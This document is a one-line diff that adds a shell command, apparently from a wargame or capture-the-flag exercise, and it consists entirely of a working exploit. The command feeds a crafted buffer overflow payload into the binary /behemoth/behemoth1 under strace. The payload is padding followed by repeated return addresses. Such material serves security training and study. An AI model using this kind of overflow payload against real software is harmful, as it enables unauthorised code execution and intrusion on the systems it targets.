@@ -1,0 +1,1 @@
+echo `python -c "print 'AAA' + (('\x3c\xc0\xff\xff') * 14) + ('\x3c\xb6\xff\xff') * 8"` | strace /behemoth/behemoth1
